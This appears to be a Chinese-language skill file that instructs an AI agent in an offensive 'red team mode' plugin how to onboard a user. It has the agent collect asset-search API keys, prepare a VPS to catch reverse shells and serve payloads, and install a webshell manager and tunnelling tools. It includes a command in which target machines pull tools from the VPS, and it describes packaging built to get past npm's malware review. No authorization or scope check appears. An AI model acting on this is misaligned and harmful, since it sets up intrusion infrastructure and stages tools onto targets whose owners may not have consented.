---
name: redteam-setup
description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
role: plan
enabled: true
---

# 首次使用引导（把环境一次配齐）

**触发条件**（满足任一即执行本技能，不要跳过）：
- `redteam_preflight` 返回里 `onboarding.complete=false`；
- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
- 用户第一次进红队模式、或明确说"环境/工具没配好"。

**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。

## 一、先确认你有没有"工具箱"（npm 版默认没有）

npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与部分落地型技能**（隧道 / 凭据 /
WebShell / 反弹 Shell / 横向移动 / 未授权利用）——本包实际随包同步的技能清单以
`<available_skills>` 与 `redteam_preflight` 的 `role_routing` 为准，不在本稿写死数目。原因：npm 的发布期自动审查会把
"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。

- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
  **由用户自己执行**，再到第三节手动配测绘 key 与 VPS；
- **Windows，或不想用脚本** → 打开 dsh-jailbreak 演练台「环境适配」，填写工具路径或选整包文件夹
  自动分配，并填 `FOFA_KEY` / `HUNTER_KEY` / `QUAKE_KEY`（至少一个，配几个用几个）、`CN_PROXY`（可选：不填时 Hunter 查询自动用免费国内代理池）、
  `REDTEAM_VPS_HOST`、`REDTEAM_VPS_KEY`；有脚本时也让**用户自己**执行
  `bash "$DSH_HOME/redteam/setup.sh" --check` 看体检；**用户同意自动装时**智能体可跑 `--yes`，
  但涉及 `sudo` 的系统依赖仍由用户自己执行。
- **都不要**也行：只用本包自带的侦察/检测向技能（`fofa-recon` / `hunter-recon` /
  `quake-recon` / `active-scan` / `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等，
  以 `<available_skills>` 与 `redteam_preflight` 的 `role_routing` 为准）也能开工，
  只是拿不到需要落地的成果。

> **征询式口径（取代旧的"一律不装"）**：AI **可以主动问用户**"要不要我帮你自动安装并配置这些环境？"
> ——得到同意后跑 `bash "$DSH_HOME/redteam/setup.sh" --yes` 装齐（只想逐项挑可选项就加 `--optional`）；
> **涉及 `sudo` 的系统依赖只把命令列出来给用户执行，AI 绝不代替用户 sudo**。用户不同意就给手动清单（见下）
> 并说明降级影响。一次问清、不回应就等，不要连问多轮。

### 装齐工具箱（有 setup.sh 时的新流程）

> **平台要求**：二进制工具箱是 **Linux x86_64** 构建（建议 Kali 虚拟机）；其他平台（macOS/arm64 等）
> `setup.sh` 会明确跳过二进制下载，只跑 **GSL5 MCP / 配置与体检**。

1. 跑 `bash "$DSH_HOME/redteam/setup.sh" --check` 拿体检结论；
2. 补齐缺口后 `--yes` 装齐（新装内容：JDK 检查 → 下载 GSL5 的 `gsl5.jar`（GodzillaSuper Release **3.1.8**，`--gsl5-jar <path>` 可用自备副本）到 `toolkit/gsl5/` → 写 MCP 行 →
   冒烟（起 headless → `GET /health` → `tools/list` 数工具，工具数以实际为准）；
   工具箱二进制：gogo / fscan / subfinder / dnsx / naabu / httpx / gospider / chisel / suo5 / frpc / frps；
   数据库利用：MDUT（可选，Linux x86_64，自带 MCP，见技能 `db-utilization`）；
   本插件不再带浏览器/Python 侧组件）。只想逐项挑可选项时用 `--optional`；
3. **系统依赖只由用户执行**：MDUT 的 GUI / MCP 依赖 webkit2gtk，`setup.sh` 会按发行版打印安装命令
   （apt / pacman / dnf），**AI 不代替用户 sudo**（macOS 首次启动的 `xattr` 去隔离同理）；
4. 装完 **重启 `dsh web`**：插件启动时会自动种入 `godzilla`（前提 `toolkit/gsl5/gsl5.jar` 就位）
   与 `mdut`（前提 toolkit/mdut 下有可执行文件）内置 MCP 服务器行。**GSL5 进程不常驻**——插件
   不会自动拉起，重启 `dsh web` 也不会；要**到演练台「MCP」页签点「启动 GSL5」**。
   （GSL5 的 `mcp` 启动时会往它认为的家目录写 Claude / Codex / Claude Desktop 客户端配置，**没有开关可关**；
   我们启动时用 `-Duser.home` + `HOME`/`USERPROFILE`/`APPDATA` 把这些写入关进 `toolkit/gsl5/run/home/`，
   **用户真实的 ~/.claude、~/.codex、Claude Desktop 配置一个字节都不会动**。setup 冒烟段同理。）
5. 到演练台「MCP」页签点「启动 GSL5」，确认状态徽标变「运行中」、`godzilla` 行显示已挂载
   （工具数以实际工具目录为准，3.1.8 实测 60），点状态徽标应显示 `✅ 可达`、`mdut` 显示已挂载；
6. 失败排查：`godzilla` 行写「GSL5 未运行 —— 点启动」是**没启动**（不是挂载失败）；其余原因展开徽标看
   （java 不在 PATH / `gsl5.jar` 缺失 / 端口 9123 被占 / token 不一致），GSL5 起停日志在
   `toolkit/gsl5/run/stdout.log`，安装日志在 `$DSH_HOME/redteam/setup.log`。

## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）

| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
| --- | --- | --- | --- |
| **测绘 key 至少一个**（`FOFA_KEY` / `HUNTER_KEY` / `QUAKE_KEY`） | 资产测绘（`fofa-recon` / `hunter-recon` / `quake-recon`）靠它铺开单位互联网资产面；**三家覆盖面不同，配几个就查几个，结果在资产库融合去重**；都没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 演练台「环境适配」，或写进 `$DSH_HOME/.env` | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
| **CN_PROXY**（可选，国内代理） | 用于只允国内 IP 访问的接口（Hunter）：**填了就用你指定的**，支持 http/https/socks5/socks5h；**不填时 Hunter 查询自动用免费国内代理池**（技能 `cn-proxy-pool`） | 演练台「环境适配」，或 `$DSH_HOME/.env` 里的 `CN_PROXY` | 不填也能查（走自动池，但免费代理不稳、可能失败）；填了走你自己的稳定出口 |
| **VPS 登录方式**（`user@ip` + 私钥或密码） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）+ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`）；没有私钥就 `REDTEAM_VPS_PASS`（密码，需本机 `sshpass`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |

**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。

**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。

### 测绘 key 怎么拿（要能指导用户）
1. **FOFA**：登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
   个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
   自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。
2. **Hunter**：登录 <https://hunter.qianxin.com> → 个人中心取 key（**接口只允国内访问**；不配 `CN_PROXY` 时查询自动用免费国内代理池，填了则只用你指定的代理）。
3. **Quake**：登录 <https://quake.360.cn> → 个人中心 → API Key。

### VPS 怎么准备（要能指导用户）
- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`
  （没有私钥只有密码时：`.env` 里写 `REDTEAM_VPS_PASS=<密码>`，本机 `apt install sshpass`，私钥优先）；
- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`（密码形态：`sshpass -p "$REDTEAM_VPS_PASS" ssh <user>@<ip> 'echo ok'`；SSH 非标端口加 `-p "$REDTEAM_VPS_PORT"`，端口写在 `.env` 的 `REDTEAM_VPS_PORT`）；
- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
  目标机可 `curl http://<ip>:9100/gogo`（或 `/fscan`）直接拉工具。

## 三、配置完的验证（必须做完才算引导成功）

逐项实测，**不要只看"文件存在"**：

```bash
# 1) FOFA key 有效
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
# 密码形态：sshpass -p "$REDTEAM_VPS_PASS" ssh -o StrictHostKeyChecking=accept-new <user>@<ip> 'echo ok'

# 3) 技能注册表可见
#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
```

> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
> （npm 版不含该脚本，见第一节）。
## 四、最后一步：写完成标记并复核

配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。

**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
这一步要明确告诉用户（智能体不能替他重启）。

## 五、用户就是不给某些资源时（降级口径）

| 缺什么 | 降级方案 | 必须向用户说明的限制 |
| --- | --- | --- |
| 测绘 key（FOFA/Hunter/Quake 都没有） | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；成果上限受影响 |
| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，内网/核心系统类成果基本放弃 |
| 本机/系统工具（nuclei 等） | 在「环境适配」补路径，或用工具箱里的替代品（httpx/subfinder 仍在）；补不上就缩小范围 | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |

**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
